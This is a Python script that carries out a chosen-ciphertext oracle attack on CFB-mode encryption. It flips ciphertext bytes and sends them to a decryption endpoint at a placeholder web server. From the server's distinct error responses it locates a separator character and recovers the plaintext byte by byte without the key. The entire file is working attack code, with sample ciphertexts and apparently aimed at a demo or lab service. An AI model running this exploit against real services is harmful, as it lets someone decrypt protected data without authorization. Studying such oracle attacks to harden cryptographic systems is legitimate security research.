#!/usr/bin/python

from base64 import *
from httplib import HTTPConnection
import commands

oracle_server = HTTPConnection('YOURWEBSERVER.COM:9999')

class ExceptionType:
    NORMAL = 1
    SEPERATOR = 2
    OTHEREXCEPTION = 3

def isascii(x):
    if type(x) == 'str':
        x = ord(x)
    return x >= int('20', 16) and x <= int('7E', 16)
def arrayToStr(a):
    str = ""
    for x in a:
        str += chr(x)
    return str
def printBytes(s):
    if type(s) == 'bytearray':
        s = str(s)
    str = ""
    for c in s:
        str += '%02X ' % c
    return str
def getExceptionType(ciphertext, verbosity=0):
    ciphertext = b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
    oracle_server.request("GET", '/cfb/decrypt/' + ciphertext)
    response = oracle_server.getresponse()
    data = response.read()
    #ciphertext = b64encode(str(ciphertext))
    #data = commands.getoutput('python commandline.py --decrypt ' + ciphertext)
    
    if 'Invalid Code' in data:
        return (ExceptionType.SEPERATOR, data)
    elif 'Successful' in data:
        return (ExceptionType.NORMAL, data)
    else:
        return (ExceptionType.OTHEREXCEPTION, data)
def printExceptionType(type):
    if type == ExceptionType.SEPERATOR:
        return "Seperator Exception"
    elif type == ExceptionType.NORMAL:
        return "Normal    Operation"
    else:
        return "Other     Exception"
        
def findSeperators(valid_ciphertext, thoroughness=1, verbosity=0):
    if type(valid_ciphertext) != bytearray:
        valid_ciphertext = bytearray(valid_ciphertext)
    if thoroughness < 1:
        thoroughness = 1 # Need at least a level of 1
    bytes = len(valid_ciphertext)
    
    seperator_vector = [0 for i in range(bytes)]
    #Flip the LSB in each byte, see the outcome
    for i in range(bytes-1, -1, -1):
        ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
        ciphertext[i] ^= 1
        answer, response = getExceptionType(ciphertext, verbosity)
        
        if verbosity > 0: print "[1]", "Byte Position", i
        if verbosity > 1: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
        if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
        if verbosity > 1: print "\t[2]", "Server Response:", response
        if verbosity > 0: print "\t[1]", printExceptionType(answer)
        
        if answer == ExceptionType.SEPERATOR:
            #Double/Triple Check...
            tempThoroughness = thoroughness
            seperatorExceptions = 1
            while tempThoroughness > 0:
                ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
                ciphertext[i] ^= tempThoroughness+1
                answer, response = getExceptionType(ciphertext, 0)
                if answer == ExceptionType.SEPERATOR:
                    seperatorExceptions += 1
                tempThoroughness -= 1
                
                if verbosity > 1: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
                if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
                if verbosity > 1: print "\t[2]", "Server Response:", response
                if verbosity > 0: print "\t[1]", printExceptionType(answer)
                
            if seperatorExceptions > 1:
                seperator_vector[i] = 1
                break
        
        if verbosity > 0: print ""

    if sum(seperator_vector) == 1:
        seperatorIndex = seperator_vector.index(1)
        print "[+] Found seperator at index", seperatorIndex
        return seperator_vector
    else:
        print "[+] Found multiple seperators at indexes", [i for i in range(bytes) if seperator_vector[i] == 1]
        return seperator_vector
        
        
def decrypt(valid_ciphertext, seperator_vector, onlyASCII=True, verbosity=0):    
    if type(valid_ciphertext) != bytearray:
        valid_ciphertext = bytearray(valid_ciphertext)
    bytes = len(valid_ciphertext)
    
    print "[+] Finding Intermediate Values..."
    
    #This will store the values that produce a seperator when submitted in that position
    found_values = []
    
    seperatorIndex = seperator_vector.index(1)
    
    #Decrypt each byte...
    for i in range(bytes):
        # Do not try to find value of seperator
        if seperator_vector[i] == 1:
            found_values.append([0])
            continue 
        elif i < seperatorIndex:
            found_values.append([0])
            continue
        
        #If there's base64 padding, we'll get a range of SeperatorExceptions in a row.
        #  This variable tracks how many we've seen, so we can throw away four in a row
        #  but focus on the individual one we see by its lonesome.
        nonSeperatorExceptionsInARow = 0
        
        #Sometimes, especially with multi-block attacks, we get unlikely and wind up with a seperator
        # appearing thanks to chance or unluckiness.  These variables try to counteract that.
        beThorough = True #If we're not thorough, we'll exit early after finding the first seperator exception.
        seperatorExceptionsFound = [] #This will hold all the possibles
        
        b = 0
        while b < 256:
            ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
            ciphertext[i] = b
            answer, response = getExceptionType(ciphertext, verbosity)
            
            if verbosity > 1: print "[1] Byte", i, ": New Value:", str(b).rjust(3, " ")
            if verbosity > 2: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
            if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
            if verbosity > 1: print "\t[2]", "Server Response:", response
            if verbosity > 1: print "\t[1]", printExceptionType(answer)
            
            if answer == ExceptionType.SEPERATOR and i != bytes - 1:
                # Modify the next byte in a random way (twice), and see if the Seperator Exception goes away, or stays for both.
                #  If it does stay for both, then it is unlikely that we're getting it because a random seperator is introduced 
                #  by a corruption of the plaintext
                
                if verbosity > 1: print "\t[1] Byte", i, ": Checking If Seperator Appeared by Unlucky"
                
                if verbosity > 1: print "\t\t[2]", "Finding Workable Value, picking two randomly"
                ciphertext[i+1] = b
                answer1, response1 = getExceptionType(ciphertext, verbosity)
                
                if verbosity > 2: print "\t\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
                if verbosity > 2: print "\t\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
                
                ciphertext[i+1] = (b + 1) % 256
                answer2, response2 = getExceptionType(ciphertext, verbosity)
                
                if verbosity > 2: print "\t\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
                if verbosity > 2: print "\t\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
                
                if verbosity > 1: print "\t\t[2]", "Server Response 1:", response1
                if verbosity > 1: print "\t\t[1]", printExceptionType(answer1)
                if verbosity > 1: print "\t\t[2]", "Server Response 2:", response2
                if verbosity > 1: print "\t\t[1]", printExceptionType(answer2)
                
                if answer1 == ExceptionType.SEPERATOR and answer2 == ExceptionType.SEPERATOR:
                    seperatorExceptionsFound.append(b)
                    if not beThorough:
                        b = 256
                else:
                    pass # Was a random introduction.
            elif answer == ExceptionType.SEPERATOR and i == bytes - 1:
                # This is the last byte, we just go with what we got.
                seperatorExceptionsFound.append(b)
                if not beThorough:
                    b = 256
            else:
                pass
            b += 1
            
        if len(seperatorExceptionsFound) < 1:
            raise Exception("Could not find a Seperator Exception for any value of Position " + str(i))
            
        if not beThorough:
            print "[+] I wasn't thorough, but I think Position", i, "has value", seperatorExceptionsFound[0]
        else:
            if len(seperatorExceptionsFound) == 1:
                print "[+] Position", i, "has value", seperatorExceptionsFound[0]
            else:
                print "[+] Position", i, "has", len(seperatorExceptionsFound), "possible values:", seperatorExceptionsFound
        found_values.append(seperatorExceptionsFound)
    
    print "[+] Beginning Decryption..."
    
    #Now try various seperators to guess which it might be.
    for sep in ["|"]:
        #Store the values we used (in case we don't use the first/only)
        used_values = []
        #Now build up an array of values in the plaintext.  
        decrypted_block = []
        #This holds the maximum number of 'possibilties' we saw for any individual value
        maxPossibilities = 1
        #This holds the bytes for which we saw other possibilities
        bytesThatCouldBeDifferent = []
        
        for i in range(bytes):
            if i == seperatorIndex:
                used_values.append(0)
                decrypted_block.append(ord(sep))
            elif i < seperatorIndex:
                used_values.append(0)
                decrypted_block.append(ord("?"))
            else:
                if len(found_values[i]) > 1 and onlyASCII:
                    bytesThatCouldBeDifferent.append(i)
                    maxPossibilities = max(maxPossibilities, len(found_values[i]))
                    
                    j = 0
                    decryptedValue = found_values[i][j] ^ valid_ciphertext[i] ^ ord(sep)
                    while not isascii(decryptedValue) and j < len(found_values[i]) - 1:
                        if verbosity > 0: print "[1] Position", i, "value", j, "is not an ASCII character, trying the next guess."
                        j += 1
                        decryptedValue = found_values[i][j] ^ valid_ciphertext[i] ^ ord(sep)
                    used_values.append(found_values[i][j])
                    decrypted_block.append(decryptedValue)
                else:
                    used_values.append(found_values[i][0])
                    decrypted_block.append(found_values[i][0] ^ valid_ciphertext[i] ^ ord(sep))
    
        if verbosity > 0: print "[1] Seperator:", sep
        if verbosity > 0: print "[1] \tUsed Intermediate Values:", used_values
        if verbosity > 0: print "[1] \tAfter XOR:               ", decrypted_block
        print "[+] Decrypted:", arrayToStr(decrypted_block)
        
        if maxPossibilities > 1:
            print "[+] However, bytes", bytesThatCouldBeDifferent, "may have up to", maxPossibilities, "alternate values."
            
#Segment Size of 1
#aa|b
valid_ciphertext = bytearray(b64decode("xX3alg=="))
#a|bb
#valid_ciphertext = bytearray(b64decode("xWAWeg=="))
#aaaaaaaaaa|bbbbbbbbbb (10)
valid_ciphertext = bytearray(b64decode("xX3HEbQm7f5QcJEIQNFwe7hdeWbn"))
    
seperator_vector = findSeperators(valid_ciphertext, thoroughness=1, verbosity=0)
decrypt(valid_ciphertext, seperator_vector, True, 0)